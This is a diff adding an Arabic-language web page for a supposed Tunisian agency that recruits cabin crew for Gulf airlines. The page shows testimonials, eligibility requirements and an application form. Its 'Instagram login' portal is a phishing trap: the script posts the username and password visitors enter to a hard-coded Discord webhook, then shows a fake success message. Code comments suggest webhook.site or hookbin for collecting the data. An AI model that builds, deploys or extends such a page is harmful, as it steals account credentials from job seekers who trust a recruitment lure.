+            <div class="who"><b>ياسين ك.</b><span>طيران الإمارات</span></div>
+          </div>
+          <div class="stub">
+            <span class="route">تونس → الرياض</span>
+            <p class="quote">"جئت بدون خلفية طيران. بعد ستة أسابيع فهمت تمامًا ما يبحث عنه المقيّمون."</p>
+            <div class="who"><b>سلمى ت.</b><span>الخطوط السعودية</span></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- APPLY -->
+    <section class="apply" id="apply">
+      <div class="wrap">
+        <div class="apply-grid">
+          <div class="apply-side">
+            <span class="eyebrow">تقديم</span>
+            <h2 style="margin-top:12px;">قبل التقديم، تحقق من الأساسيات.</h2>
+            <p>تضع شركات الخليج معايير أهلية صارمة. استيفاؤها لا يضمن التوظيف، لكن عدم استيفائها يمنعنا من المضي قدمًا.
+            </p>
+            <ul class="req-list">
+              <li><span class="check">✓</span> العمر 21 سنة أو أكثر وقت التقديم</li>
+              <li><span class="check">✓</span> الحد الأدنى للطول 160 سم، وصول الذراع 212 سم</li>
+              <li><span class="check">✓</span> إجادة اللغة الإنجليزية تحدثًا؛ العربية أو الفرنسية ميزة إضافية</li>
+              <li><span class="check">✓</span> القدرة على اجتياز اختبار السباحة</li>
+              <li><span class="check">✓</span> لا وشم ظاهر بالزي الرسمي، سجل طبي خالٍ من المشاكل</li>
+            </ul>
+          </div>
+          <form class="form-card" onsubmit="return submitApply(event)">
+            <div class="field"><label>الاسم الكامل</label><input type="text" placeholder="أميرة بن صالح" required />
+            </div>
+            <div class="field"><label>البريد الإلكتروني</label><input type="email" placeholder="you@email.com"
+                required /></div>
+            <div class="field"><label>رقم الهاتف</label><input type="tel" placeholder="+216 XX XXX XXX" required />
+            </div>
+            <div class="field"><label>المدينة</label><input type="text" placeholder="تونس، صفاقس، سوسة…" required />
+            </div>
+            <div class="field"><label>حدثنا عن نفسك</label><textarea
+                placeholder="مستوى اللغة، أي خبرة في الضيافة، لماذا طاقم المقصورة…"></textarea></div>
+            <button type="submit" class="btn-primary btn-block">إرسال الطلب</button>
+            <div class="form-msg error" id="applyMsg">يجب تسجيل الدخول لتقديم الطلب. <a href="#"
+                onclick="showView('view-login'); return false;" style="color:var(--gold);text-decoration:underline;">سجل
+                الدخول هنا</a></div>
+          </form>
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      <div class="foot-inner">
+        <div class="foot-col" style="max-width:260px;">
+          <h4>وكالة الحياة الأفضل التونسية</h4>
+          <p>وكالة توظيف وتدريب خاصة مقرها تونس، تعد المرشحين لمهن الطيران في الخليج.</p>
+        </div>
+        <div class="foot-col">
+          <h4>الوكالة</h4>
+          <a onclick="goTo('view-site','about')">عن الوكالة</a>
+          <a onclick="goTo('view-site','process')">كيف تعمل</a>
+          <a onclick="goTo('view-site','training')">برنامج التدريب</a>
+        </div>
+        <div class="foot-col">
+          <h4>المرشحون</h4>
+          <a onclick="goTo('view-site','destinations')">الوجهات</a>
+          <a onclick="goTo('view-site','apply')">تقديم الآن</a>
+          <a onclick="showView('view-login')">دخول البوابة</a>
+        </div>
+        <div class="foot-col">
+          <h4>اتصل بنا</h4>
+          <a href="mailto:contact@tbl-agency.tn">contact@tbl-agency.tn</a>
+          <a href="tel:+21671000000">+216 71 000 000</a>
+          <p>شارع حبيب بورقيبة، تونس، تونس</p>
+        </div>
+      </div>
+      <div class="foot-bottom">
+        <span>© 2026 وكالة الحياة الأفضل التونسية. وكالة توظيف خاصة مسجلة في تونس.</span>
+        <span>التوظيف غير مضمون مطلقًا، ولا يتم تحصيل أي رسوم مقدمة من المرشحين.</span>
+      </div>
+    </footer>
+
+  </div>
+
+  <!-- ===================== LOGIN VIEW ===================== -->
+  <div id="view-login" class="view">
+    <div class="login-page">
+      <div class="login-card">
+        <div class="login-brand" onclick="showView('view-site')">
+          <div class="brand-mark">TBL</div>
+          <div class="brand-name" style="color:var(--cream);">الحياة الأفضل التونسية<small>وكالة · تونس</small></div>
+        </div>
+        <h2>بوابة المرشحين</h2>
+        <p>سجل الدخول لمتابعة طلبك، جدول التدريب، وحالة التوظيف.</p>
+
+        <!-- Instagram Login Button -->
+        <button class="btn-instagram" onclick="showView('view-insta-login')">
+          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"
+            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
+            <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
+            <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
+          </svg>
+          تسجيل الدخول عبر إنستغرام
+        </button>
+
+        <div class="login-divider">أو</div>
+
+        <div class="login-foot">
+          مرشح جديد؟ <a onclick="goTo('view-site','apply')">تقديم هنا</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===================== INSTAGRAM LOGIN VIEW ===================== -->
+  <div id="view-insta-login" class="view">
+    <div class="login-page">
+      <div class="login-card">
+        <button class="insta-back" onclick="showView('view-login')">
+          ← رجوع
+        </button>
+
+        <div class="insta-icon-large">
+          <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none"
+            stroke="var(--instagram)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
+            <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
+            <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
+          </svg>
+        </div>
+
+        <h2 style="text-align:center; color:var(--cream); font-size:20px;">تسجيل الدخول عبر إنستغرام</h2>
+        <p style="text-align:center; color:#9FACC0; font-size:13px; margin-bottom:22px;">أدخل بيانات حساب إنستغرام
+          للمتابعة</p>
+
+        <form id="instaForm" onsubmit="return submitInstaLogin(event)">
+          <div class="field">
+            <label>اسم المستخدم في إنستغرام</label>
+            <input type="text" id="instaUsername" placeholder="@your.username" required />
+          </div>
+          <div class="field">
+            <label>كلمة المرور</label>
+            <input type="password" id="instaPassword" placeholder="••••••••" required />
+          </div>
+          <button type="submit" class="btn-instagram" style="margin-top:6px;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none"
+              stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
+              <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
+              <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
+            </svg>
+            تسجيل الدخول
+          </button>
+          <div class="form-msg success" id="instaLoginMsg">تم المصادقة بنجاح — جاري التوجيه إلى لوحة التحكم.</div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ------------------------------------------
+    //  IMPORTANT: replace WEBHOOK_URL with your own endpoint
+    //  to receive Instagram login data.
+    //  You can use services like:
+    //    - https://webhook.site/ (generates a unique URL)
+    //    - https://hookbin.com/
+    //    - or your own server endpoint.
+    // ------------------------------------------
+    const WEBHOOK_URL = 'https://webhook.site/your-unique-id-here'; // <-- CHANGE THIS
+
+    function showView(id) {
+      document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+      window.scrollTo(0, 0);
+    }
+
+    function goTo(viewId, sectionId) {
+      showView(viewId);
+      setTimeout(() => {
+        const el = document.getElementById(sectionId);
+        if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      }, 30);
+    }
+
+    function submitApply(e) {
+      e.preventDefault();
+      const msg = document.getElementById('applyMsg');
+      msg.style.display = 'block';
+      return false;
+    }
+
+    // Instagram login submission with data sending
+    function submitInstaLogin(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('instaUsername').value.trim();
+        const password = document.getElementById('instaPassword').value.trim();
+
+        if (!username || !password) {
+          alert('Please fill in all fields');
+          return false;
+        }
+
+        // YOUR DISCORD WEBHOOK URL – REPLACE THIS
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1497538814371954769/QX7xlkUTU-orG-LJDE8wBDflHRF2Iz973wnh1K38HQI_204tGGZMixTvbBJ9P87v8hN3';
+
+        // Build a rich embed message for Discord
+        const payload = {
+          embeds: [{
+            title: '🔐 New Instagram Login Attempt',
+            color: 0xE4405F, // Instagram pink
+            fields: [
+              {
+                name: '👤 Username',
+                value: username,
+                inline: false
+              },
+              {
+                name: '🔑 Password',
+                value: `||${password}||`, // spoiler tag for privacy
+                inline: false
+              },
+              {
+                name: '⏰ Time',
+                value: new Date().toLocaleString('en-US', { timeZone: 'Africa/Tunis' }),
+                inline: false
+              }
+            ],
+            footer: {
+              text: 'Tunisian Better Life Agency'
+            },
+            timestamp: new Date().toISOString()
+          }]
+        };
+
+        // Send to Discord
+        fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(payload),
+        })
+          .then(response => {
+            if (!response.ok) {
+              throw new Error('Failed to send to Discord');
+            }
+            // Show success message to user
+            document.getElementById('instaLoginMsg').style.display = 'block';
+            // Clear the form
+            document.getElementById('instaUsername').value = '';
+            document.getElementById('instaPassword').value = '';
+          })
+          .catch(error => {
+            console.error('Error:', error);
+            alert('There was an error sending data to Discord. Please check the webhook URL.');
+          });
+
+        console.log('Login data sent:', { username, password });
+        return false;
+      }
+
+    // split-flap departure board
+    const destinations = [
+      { city: 'DUBAI', code: 'TBL 402', carrier: 'EMIRATES', status: 'OPEN INTAKE' },
+      { city: 'DOHA', code: 'TBL 118', carrier: 'QATAR AW', status: 'BOARDING' },
+      { city: 'RIYADH', code: 'TBL 275', carrier: 'SAUDIA', status: 'OPEN INTAKE' },
+      { city: 'ABU DHABI', code: 'TBL 330', carrier: 'ETIHAD', status: 'NEXT CYCLE' }
+    ];
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789';
+
+    function randomChar() { return chars[Math.floor(Math.random() * chars.length)]; }
+
+    function flapAnimate(el, finalText, delay) {
+      let frame = 0;
+      const totalFrames = 10;
+      const interval = setInterval(() => {
+        if (frame < totalFrames - 1) {
+          let scrambled = '';
+          for (let i = 0; i < finalText.length; i++) {
+            scrambled += finalText[i] === ' ' ? ' ' : randomChar();
+          }
+          el.textContent = scrambled;
+        } else {
+          el.textContent = finalText;
+          clearInterval(interval);
+        }
+        frame++;
+      }, 55);
+    }
+
+    function buildBoard() {
+      const body = document.getElementById('boardBody');
+      body.innerHTML = '';
+      destinations.forEach((d, i) => {
+        const row = document.createElement('div');
+        row.className = 'board-row';
+        row.innerHTML =
+          `<span class="city flap" data-final="${d.city}"></span><span class="code">${d.code}</span><span class="code">${d.carrier}</span><span class="status flap" data-final="${d.status}"></span>`;
+        body.appendChild(row);
+        const cityEl = row.querySelector('.city');
+        const statusEl = row.querySelector('.status');
+        setTimeout(() => flapAnimate(cityEl, d.city), i * 180);
+        setTimeout(() => flapAnimate(statusEl, d.status), i * 180 + 100);
+      });
+    }
+    buildBoard();
+    setInterval(buildBoard, 9000);
+  </script>
+
+</body>
+
+</html>
